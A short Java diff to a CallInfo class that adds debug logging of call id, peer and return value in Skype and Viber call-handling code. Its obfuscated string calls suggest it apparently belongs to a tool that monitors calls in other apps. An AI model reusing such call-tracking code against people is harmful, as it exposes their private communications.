@@ -119,7 +119,7 @@ public class CallInfo {
 				if (helper != null) {
 					ret = ChatSkype.getCurrentCall(helper, this);
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (updateCallInfo): id: " + this.id + " peer: " + this.peer);
+						Check.log(TAG + " SKYPE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
 					}
 				}
 
@@ -149,6 +149,9 @@ public class CallInfo {
 				this.account = M.e("delay");
 				this.peer = M.e("delay");
 				ret = true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " VIBER (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
 			}
 
 			return ret;
